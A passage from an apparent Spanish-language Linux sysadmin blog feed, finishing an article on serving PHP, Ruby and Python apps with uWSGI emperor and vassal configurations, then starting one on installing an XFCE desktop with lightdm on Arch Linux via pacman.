Se utilizarán &lt;span class="m"&gt;49&lt;/span&gt;,9 MB de espacio de disco adicional después de esta operación.
...  
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Adicionalmente, el &lt;em&gt;plugin&lt;/em&gt; de &lt;strong&gt;ruby&lt;/strong&gt; necesita tener el paquete &lt;em&gt;rack&lt;/em&gt; instalado, así que lo ponemos también.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install -y ruby-rack
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...  
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;8&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.354 kB de archivos.
Se utilizarán &lt;span class="m"&gt;2&lt;/span&gt;.687 kB de espacio de disco adicional después de esta operación.
...  
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En todos los casos, bastará con poner un fichero de configuración en &lt;em&gt;/etc/uwsgi-emperor/vassals/&lt;/em&gt; para activar cada una de las aplicaciones.&lt;/p&gt;
&lt;h2&gt;Sirviendo ficheros PHP&lt;/h2&gt;
&lt;p&gt;Crearemos una carpeta contenedora para nuestros ficheros &lt;strong&gt;PHP&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /opt/php/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En esa carpeta vamos a poner algún fichero &lt;em&gt;.php&lt;/em&gt; para tener algo que servir y demostrar que funciona. Con algo simple nos vale.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /opt/php/index.php
Hello from PHP, version &amp;lt;?php &lt;span class="nb"&gt;echo&lt;/span&gt; phpversion&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; ?&amp;gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a poner un fichero de configuración que sirva &lt;strong&gt;PHP&lt;/strong&gt;, prácticamente copiado de la documentación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/uwsgi-emperor/vassals/php.ini
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;:php
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :8080
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;project_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/php/
check-static &lt;span class="o"&gt;=&lt;/span&gt; %&lt;span class="o"&gt;(&lt;/span&gt;project_dir&lt;span class="o"&gt;)&lt;/span&gt;
static-skip-ext &lt;span class="o"&gt;=&lt;/span&gt; .php
static-skip-ext &lt;span class="o"&gt;=&lt;/span&gt; .inc
php-docroot &lt;span class="o"&gt;=&lt;/span&gt; %&lt;span class="o"&gt;(&lt;/span&gt;project_dir&lt;span class="o"&gt;)&lt;/span&gt;
php-allowed-ext &lt;span class="o"&gt;=&lt;/span&gt; .php
php-index &lt;span class="o"&gt;=&lt;/span&gt; index.php
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y el &lt;em&gt;emperor&lt;/em&gt; se dedicará a levantar un proceso para servir esta aplicación. No hay que reiniciar nada. Lo comprobamos con una petición desde una máquina que vea a nuestro servidor:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.2:8080/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Hello from PHP, version &lt;span class="m"&gt;5&lt;/span&gt;.6.20-0+deb8u1
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Sirviendo una aplicación ruby mediante el protocolo rack&lt;/h2&gt;
&lt;p&gt;Siguiendo los mismos pasos que en el paso anterior, creamos la carpeta contenedora.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /opt/ruby/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En esta carpeta ponemos una aplicación &lt;em&gt;rack&lt;/em&gt; mínima, que he copiado de internet. Normalmente, la gente suele usar &lt;em&gt;frameworks&lt;/em&gt;, pero el resultado es el mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /opt/ruby/ruby.ru
&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; lambda &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;env&lt;span class="p"&gt;|&lt;/span&gt;
  &lt;span class="nv"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello, World!&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;200&lt;/span&gt;, &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;Content-Length&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; body.length.to_s&lt;span class="o"&gt;}&lt;/span&gt;, &lt;span class="o"&gt;[&lt;/span&gt;body&lt;span class="o"&gt;]]&lt;/span&gt; end
run app
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y basta con declarar un fichero de configuración para que se active la nueva aplicación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/uwsgi-emperor/vassals/ruby.ini
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; rack_ruby21
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :3031
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;rack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/ruby/ruby.ru
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nuevamente podemos comprobar que el resultado es el esperado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.2:3031/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Hello, World!
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Sirviendo una aplicación python mediante el protocolo WSGI&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos una carpeta contenedora para nuestra aplicación, como en los casos anteriores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /opt/py/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En ella tenemos una aplicación que cumple con el protocolo &lt;strong&gt;WSGI&lt;/strong&gt;. Nuevamente vamos a simplificar el ejemplo a base de no utilizar ningún &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /opt/py/app.py
def application&lt;span class="o"&gt;(&lt;/span&gt;environ, start_response&lt;span class="o"&gt;)&lt;/span&gt;:
    start_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)])&lt;/span&gt;
    yield &lt;span class="s1"&gt;&amp;#39;Hello World from python&amp;#39;&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Configuramos el &lt;em&gt;vassal&lt;/em&gt; que va a dar a conocer la aplicación al &lt;em&gt;emperor&lt;/em&gt;, de forma que este la pueda levantar automáticamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/uwsgi-emperor/vassals/py.ini
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :5000
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/py/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:application
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y vemos como todo funciona como debe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.2:5000/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Hello World from python
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante indicar que el &lt;em&gt;plugin&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt; soporta muchas mas directivas, entre ellas, la posibilidad de añadir variables de sistema como el &lt;em&gt;PYTHONPATH&lt;/em&gt;, o la de usar un &lt;em&gt;virtualenv&lt;/em&gt; propio para nuestra aplicación. Es por este motivo que me enamoré de este servidor de aplicaciones.&lt;/p&gt;</content><category term="uWSGI"></category><category term="plugins"></category><category term="PHP"></category><category term="ruby"></category><category term="python"></category></entry><entry><title>Un escritorio con Archlinux</title><link href="http://www.linuxsysadmin.ml/2016/07/un-escritorio-con-archlinux.html" rel="alternate"></link><published>2016-07-25T08:00:00+02:00</published><updated>2016-07-25T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-07-25:/2016/07/un-escritorio-con-archlinux.html</id><summary type="html">&lt;p&gt;En &lt;a href="http://www.linuxsysadmin.ml/2016/04/un-escritorio-minimo-con-debian.html"&gt;otro articulo&lt;/a&gt; vimos como instalar &lt;strong&gt;Archlinux&lt;/strong&gt;. Como tantas otras distribuciones nos vale para servidor y como distribución de escritorio. Sin embargo, debido a su filosofía como &lt;em&gt;rolling release&lt;/em&gt;, puede asustarnos un poco como servidor; aunque tener un escritorio "a la última" es un caramelo que muy pocos podemos rechazar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En &lt;a href="http://www.linuxsysadmin.ml/2016/04/un-escritorio-minimo-con-debian.html"&gt;otro articulo&lt;/a&gt; vimos como instalar &lt;strong&gt;Archlinux&lt;/strong&gt;. Como tantas otras distribuciones nos vale para servidor y como distribución de escritorio. Sin embargo, debido a su filosofía como &lt;em&gt;rolling release&lt;/em&gt;, puede asustarnos un poco como servidor; aunque tener un escritorio "a la última" es un caramelo que muy pocos podemos rechazar.&lt;/p&gt;
&lt;p&gt;Vamos a instalar un escritorio basado en &lt;strong&gt;XFCE&lt;/strong&gt;, que es bueno, bonito y barato. Me encanta personalmente porque no usa muchos recursos, responde rápido y tiene muchas herramientas de configuración, a diferencia de otros, por ejemplo &lt;strong&gt;LXDE&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Empezaremos instalando la capa gráfica. Esto se consigue mediante el paquete &lt;strong&gt;xorg&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S xorg&lt;/span&gt;
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alternativamente, podemos instalar solamente el servidor gráfico y los &lt;em&gt;drivers&lt;/em&gt; necesarios. Esto es especialmente importante en &lt;strong&gt;Archlinux&lt;/strong&gt; porque los paquetes se actualizan muy a menudo, y por lo tanto, tener paquetes que no vamos a usar solo incrementa el tiempo del &lt;em&gt;update&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S xorg-server xf86-input-mouse xf86-input-keyboard xf86-input-synaptics xf86-video-vesa&lt;/span&gt;
resolviendo dependencias…
:: Existen &lt;span class="m"&gt;4&lt;/span&gt; proveedores disponibles para libgl:
:: Repositorio extra
   &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; mesa-libgl  &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; nvidia-304xx-libgl  &lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; nvidia-340xx-libgl  &lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; nvidia-libgl

Introduzca un número &lt;span class="o"&gt;(&lt;/span&gt;por &lt;span class="nv"&gt;omisión&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
:: Existen &lt;span class="m"&gt;2&lt;/span&gt; proveedores disponibles para xf86-input-driver:
:: Repositorio extra
   &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xf86-input-evdev  &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xf86-input-libinput

Introduzca un número &lt;span class="o"&gt;(&lt;/span&gt;por &lt;span class="nv"&gt;omisión&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
buscando conflictos entre paquetes…
advertencia: bucle de dependencias detectado:
advertencia: harfbuzz será instalado antes que su dependencia freetype2

Paquetes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;62&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; damageproto-1.2.1-3  elfutils-0.166-1  fixesproto-5.0-3  fontconfig-2.12.0-1  fontsproto-2.1.3-1  freetype2-2.6.3-1
              graphite-1:1.3.8-1  harfbuzz-1.2.7-1  inputproto-2.3.2-1  kbproto-1.0.7-1  libdrm-2.4.68-1  libepoxy-1.3.1-1
              libevdev-1.5.2-1  libfontenc-1.1.3-1  libomxil-bellagio-0.9.3-1  libpciaccess-0.13.4-1  libpng-1.6.23-1
              libtxc_dxtn-1.0.1-6  libunwind-1.1-3  libx11-1.6.3-1  libxau-1.0.8-2  libxcb-1.12-1  libxdamage-1.1.4-2
              libxdmcp-1.1.2-1  libxext-1.3.3-1  libxfixes-5.0.2-1  libxfont-1.5.1-1  libxi-1.7.6-1  libxkbfile-1.0.9-1
              libxml2-2.9.4+0+gbdec218-2  libxshmfence-1.2-1  libxtst-1.2.2-1  libxxf86vm-1.1.4-1  llvm-libs-3.8.0-1
              mesa-11.2.2-1  mesa-libgl-11.2.2-1  mtdev-1.1.5-1  pixman-0.34.0-1  recordproto-1.14.2-2  wayland-1.11.0-1
              xcb-proto-1.12-2  xextproto-7.3.0-1  xf86-input-evdev-2.10.3-1  xf86vidmodeproto-2.3.1-3  xkeyboard-config-2.18-1
              xorg-bdftopcf-1.0.5-1  xorg-font-util-1.3.1-1  xorg-font-utils-7.6-4  xorg-fonts-alias-1.0.3-1
              xorg-fonts-encodings-1.0.4-4  xorg-fonts-misc-1.0.3-4  xorg-mkfontdir-1.0.7-2  xorg-mkfontscale-1.1.2-1
              xorg-server-common-1.18.3-2  xorg-setxkbmap-1.3.1-1  xorg-xkbcomp-1.3.1-1  xproto-7.0.29-1
              xf86-input-keyboard-1.8.1-2  xf86-input-mouse-1.9.1-2  xf86-input-synaptics-1.8.99.1-1  xf86-video-vesa-2.3.4-2
              xorg-server-1.18.3-2

Tamaño total de la descarga:     &lt;span class="m"&gt;37&lt;/span&gt;,78 MiB
Tamaño total de la instalación:  &lt;span class="m"&gt;150&lt;/span&gt;,38 MiB

:: ¿Continuar con la instalación? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Una vez tenemos el servidor gráfico, el siguiente paso es el escritorio que elijamos. Tras buscar el &lt;a href="https://www.archlinux.org/groups/"&gt;el índice de grupos&lt;/a&gt;, me decanté por &lt;strong&gt;XFCE&lt;/strong&gt;, aunque hay para todos los gustos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S xfce4 xfce4-goodies&lt;/span&gt;
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si lo queréis un poco mas &lt;em&gt;minimal&lt;/em&gt;, solo haría falta el paquete &lt;strong&gt;xfce4&lt;/strong&gt;. Para ser breves, me limito a este solamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S xfce4&lt;/span&gt;
:: Hay &lt;span class="m"&gt;17&lt;/span&gt; miembros en el grupo xfce4:
:: Repositorio extra
   &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; exo  &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; garcon  &lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; gtk-xfce-engine  &lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; thunar  &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; thunar-volman  &lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; tumbler  &lt;span class="m"&gt;7&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-appfinder  &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-mixer
   &lt;span class="m"&gt;9&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-panel  &lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-power-manager  &lt;span class="m"&gt;11&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-session  &lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-settings  &lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfce4-terminal  &lt;span class="m"&gt;14&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfconf  &lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfdesktop
   &lt;span class="m"&gt;16&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfwm4  &lt;span class="m"&gt;17&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; xfwm4-themes

Introduzca una selección &lt;span class="o"&gt;(&lt;/span&gt;por &lt;span class="nv"&gt;omisión&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;todos&lt;span class="o"&gt;)&lt;/span&gt;:
resolviendo dependencias…
buscando conflictos entre paquetes…

Paquetes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;113&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; adwaita-icon-theme-3.20-2  alsa-lib-1.1.1-1  at-spi2-atk-2.20.1-2  at-spi2-core-2.20.2-1  atk-2.20.0-1
               avahi-0.6.32-2  cairo-1.14.6-1  cantarell-fonts-1:0.0.24-1  cdparanoia-10.2-5  colord-1.3.2-2
               compositeproto-0.4.2-3  dbus-glib-0.106-1  dconf-0.26.0-1  desktop-file-utils-0.22-2  gdk-pixbuf2-2.34.0-2
               glib-networking-2.48.2-1  gnome-icon-theme-3.12.0-3  gnome-icon-theme-symbolic-3.12.0-4
               gnome-themes-standard-3.20.2-1  gsettings-desktop-schemas-3.21.2-1  gstreamer0.10-0.10.36-4
               gstreamer0.10-base-0.10.36-3  gstreamer0.10-base-plugins-0.10.36-3  gtk-update-icon-cache-3.20.6-1  gtk2-2.24.30-2
               gtk3-3.20.6-1  hicolor-icon-theme-0.15-1  iso-codes-3.68-1  jasper-1.900.1-15  js17-17.0.0-3  json-glib-1.2.0-1
               lcms2-2.7-1  libcroco-0.6.11-1  libcups-2.1.4-1  libdaemon-0.14-3  libdatrie-0.2.10-1  libexif-0.6.21-2
               libgudev-230-1  libgusb-0.2.9-1  libice-1.0.9-1  libimobiledevice-1.2.0-3  libjpeg-turbo-1.5.0-1
               libkeybinder2-0.3.0-2  libnotify-0.7.6-2  libogg-1.3.2-1  libplist-1.12-4  libproxy-0.4.12-2  librsvg-2:2.40.16-1
               libsm-1.2.2-2  libsoup-2.54.1-1  libthai-0.1.24-1  libtheora-1.1.1-3  libtiff-4.0.6-2  libunique-1.1.6-6
               libusbmuxd-1.0.10-1  libvisual-0.4.0-6  libvorbis-1.3.5-1  libwnck-2.31.0-1  libxcomposite-0.4.4-2
               libxcursor-1.1.14-2  libxfce4ui-4.12.1-2  libxfce4util-4.12.1-1  libxft-2.3.2-1  libxinerama-1.1.3-2
               libxkbcommon-0.6.1-1  libxklavier-5.4-1  libxmu-1.1.2-1  libxrandr-1.5.0-1  libxrender-0.9.9-1  libxres-1.0.7-1
               libxt-1.1.5-1  libxv-1.0.10-1  nspr-4.12-1  orc-0.4.25-2  pango-1.40.1-1  perl-uri-1.71-1  polkit-0.113-4
               polkit-gnome-0.105-3  randrproto-1.5.0-1  renderproto-0.11.1-3  rest-0.8.0-1  shared-mime-info-1.6-2
               startup-notification-0.12-4  ttf-dejavu-2.35-1  upower-0.99.4-2  videoproto-2.3.3-1  vte-0.28.2-7
               vte-common-0.44.2-1  wayland-protocols-1.4-1  xcb-util-0.4.0-1  xineramaproto-1.2.1-3  xorg-iceauth-1.0.7-1
               xorg-xauth-1.0.9-1  xorg-xinit-1.3.4-4  xorg-xmodmap-1.0.9-1  xorg-xrdb-1.1.0-2  exo-0.10.7-2  garcon-0.4.0-1
               gtk-xfce-engine-2.10.1-1  thunar-1.6.10-3  thunar-volman-0.8.1-2  tumbler-0.1.31-1  xfce4-appfinder-4.12.0-4
               xfce4-mixer-4.11.0-3  xfce4-panel-4.12.0-2  xfce4-power-manager-1.4.4-2  xfce4-session-4.12.1-4
               xfce4-settings-4.12.0-4  xfce4-terminal-0.6.3-3  xfconf-4.12.0-4  xfdesktop-4.12.3-2  xfwm4-4.12.3-2
               xfwm4-themes-4.10.0-2

Tamaño total de la descarga:     &lt;span class="m"&gt;65&lt;/span&gt;,79 MiB
Tamaño total de la instalación:  &lt;span class="m"&gt;298&lt;/span&gt;,53 MiB

:: ¿Continuar con la instalación? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como pequeño inconveniente ante otras distribuciones, como &lt;strong&gt;Debian&lt;/strong&gt;, los paquetes no tienen tantas dependencias, dejando al usuario elegir lo que pone o no.&lt;/p&gt;
&lt;p&gt;Como requisito para tener algunas de las funcionalidades del escritorio, por ejemplo la papelera, es necesario instalar otros paquetes. En el caso concreto de la papelera, se necesita el paquete &lt;strong&gt;gvfs&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S gvfs&lt;/span&gt;
resolviendo dependencias…
buscando conflictos entre paquetes…

Paquetes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; fuse-2.9.6-1  gcr-3.20.0-1  libatasmart-0.19-3  libbluray-0.9.2-2  libcddb-1.3.2-4  libcdio-0.93-3
              libcdio-paranoia-10.2+0.93+1-2  libsecret-0.18.5-1  udisks2-2.1.7-1  gvfs-1.28.2-1

Tamaño total de la descarga:     &lt;span class="m"&gt;3&lt;/span&gt;,84 MiB
Tamaño total de la instalación:  &lt;span class="m"&gt;23&lt;/span&gt;,45 MiB

:: ¿Continuar con la instalación? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso es el gestor de entrada. Podemos entrar mediante un &lt;em&gt;login&lt;/em&gt; texto, y escalar a gráficos con &lt;em&gt;startx&lt;/em&gt;, pero es mas bonito y cómodo usar un gestor gráfico como &lt;strong&gt;lightdm&lt;/strong&gt;. En caso de &lt;strong&gt;Archlinux&lt;/strong&gt;, no depende de ninguna librería gráfica, y hay que decidirlo por nosotros mismos. Puesto que &lt;strong&gt;XFCE&lt;/strong&gt; usa las librerías &lt;strong&gt;GTK&lt;/strong&gt;, vamos a aprovecharnos de ello.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S lightdm lightdm-gtk-greeter&lt;/span&gt;
resolviendo dependencias…
buscando conflictos entre paquetes…

Paquetes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; lightdm-1:1.18.1-2  lightdm-gtk-greeter-1:2.0.1-3

Tamaño total de la descarga:    &lt;span class="m"&gt;0&lt;/span&gt;,27 MiB
Tamaño total de la instalación:  &lt;span class="m"&gt;2&lt;/span&gt;,68 MiB

:: ¿Continuar con la instalación? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


